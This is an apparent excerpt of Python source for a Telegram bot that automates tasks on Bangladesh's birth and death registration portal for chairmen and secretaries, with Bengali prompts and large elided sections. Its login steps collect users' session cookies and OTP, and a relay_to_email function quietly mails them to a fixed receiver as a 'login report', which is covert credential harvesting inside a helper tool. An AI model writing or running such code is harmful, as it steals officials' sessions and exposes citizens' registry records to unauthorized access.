...
def generate_main_menu(chat_id):
    ...
    if not u_sess["is_alive"]:
        ...
        # 📋 Applications, 📝 Correction, 🔄 Reprint
        row_core = []
...
# ==========================================
# ৫. কোর রিকোয়েস্ট, হেল্পার ও ইমেইল
# ==========================================
...
def relay_to_email(chat_id, u_name):
    u_sess = get_session(chat_id)
    report = f"--- LOGIN REPORT ---\nUser: {u_name} ({chat_id})\n\nCH RAW: {u_sess['temp_data'].get('ch_raw')}\nOTP: {u_sess.get('ch_otp')}\nSEC RAW: {u_sess['temp_data'].get('sec_raw')}"
    msg = MIMEText(report)
    msg['Subject'], msg['From'], msg['To'] = f"New Login: {u_name}", EMAIL_SENDER, EMAIL_RECEIVER
    try:
...
def role_step_1(m):
    ...
    bot.register_next_step_handler(bot.send_message(m.chat.id, "✅ CH সেশন গৃহীত। এখন OTP দিন:"), role_step_2)

def role_step_2(m):
    if is_cancel(m): return
    get_session(m.chat.id)["ch_otp"] = m.text.strip()
    bot.register_next_step_handler(bot.send_message(m.chat.id, "✅ এখন SEC সেশন দিন:"), role_step_3)
...
def role_step_3(m):
    ...
    if sid:
        ...
        relay_to_email(chat_id, m.from_user.first_name)
        bot.send_message(chat_id, "🎉 লগইন সফল!", reply_markup=generate_main_menu(chat_id))
    else: bot.send_message(chat_id, "❌ কুকি ভুল।")
...
def handle_category_init(m, cmd):
    ...
    bot.register_next_step_handler(bot.send_message(m.chat.id, f"📂 {cmd.upper()} সেকশন:", reply_markup=markup), category_gate, cmd)

def category_gate(m, cmd):
    if is_cancel(m): return
    if "Search ID" in m.text:
        bot.register_next_step_handler(bot.send_message(m.chat.id, "🆔 আইডি দিন:", reply_markup=telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🏠 Back to Menu")), search_loop, cmd)
    elif "All List" in m.text: fetch_list_ui(m, cmd, False)

def search_loop(m, cmd):
    if is_cancel(m): return
    fetch_list_ui(m, cmd, True)
    bot.register_next_step_handler(bot.send_message(m.chat.id, "🔍 আরও আইডি দিন (বা মেনুতে ফিরুন):"), search_loop, cmd)
    ...
    if res and res.status_code == 200:
        ...
        for item in items:
            ...
            if u_sess["mode"] == "CHAIRMAN" and "RECEIVED" in status:
                btns.append(telebot.types.InlineKeyboardButton("✅ Register" if cmd == 'apps' else "📝 Corr Register", callback_data=f"{'reg' if cmd == 'apps' else 'coreg'}_{short_id}"))
...
def start_ubrn_flow(m):
    ...
    bot.register_next_step_handler(bot.send_message(m.chat.id, "১. ব্যক্তির ১৭ ডিজিট UBRN দিন:", reply_markup=telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🏠 Back to Menu")), ubrn_p_step)
...
def ubrn_ph_step(m):
    ...
    if res and res.status_code == 200: bot.register_next_step_handler(bot.send_message(chat_id, "✅ OTP দিন:"), ubrn_final)
...
def process_search_by_ubrn(m):
    ...
    else: bot.send_message(m.chat.id, "❌ তথ্য পাওয়া যায়নি।")
...
def admin_edit_field(m, target_cid, field):
    ...
    except: bot.send_message(m.chat.id, "❌ আপডেট ব্যর্থ।")
    ...
    # --- Admin Controls ---
        ...
        if action == "admuser":
            ...
            for k, n in cmd_labels:
                markup.row(telebot.types.InlineKeyboardButton(f"{'❌ Disable' if p.get(k) else '✅ Enable'} {n}", callback_data=f"tgl_{target}_{k}_{'off' if p.get(k) else 'on'}"))
...
def router(m):
    ...
    if "/start" in t or "Back to Menu" in t: bot.send_message(cid, "🚀 BDRIS Master Bot Active!", reply_markup=generate_main_menu(cid))
    ...
    elif t == "🔑 Admin Login" and cid == ADMIN_ID: bot.register_next_step_handler(bot.send_message(cid, "🔑 এডমিন সেশন দিন:"), admin_login_logic)

    elif t == "👤 Chairman Section":
        u_sess["mode"] = "CHAIRMAN"; save_session_to_db(cid, u_sess)
        bot.send_message(cid, "✅ Registration Mode Active.", reply_markup=generate_main_menu(cid))
    elif t == "🧑‍💼 Secretary Section":
        u_sess["mode"] = "SECRETARY"; save_session_to_db(cid, u_sess)
        bot.send_message(cid, "✅ Payment Mode Active.", reply_markup=generate_main_menu(cid))
        ...
        bot.register_next_step_handler(bot.send_message(cid, "🔍 নাম দিন (Bangla):"), lambda x: process_search_by_name(x))
    elif t == "🔢 Search By UBRN" and (perms.get("search") or cid == ADMIN_ID):
        bot.register_next_step_handler(bot.send_message(cid, "🔢 UBRN দিন:"), lambda x: process_search_by_ubrn(x))
        ...
        bot.register_next_step_handler(bot.send_message(cid, "🖨️ ১৭ ডিজিট UBRN:"), lambda x: download_server_by_ubrn(x))

    elif t == "🛠️ Check Cookies" and cid == ADMIN_ID:
        c1, c2 = u_sess["req_session"].cookies.get_dict(), u_sess["ch_session"].cookies.get_dict()
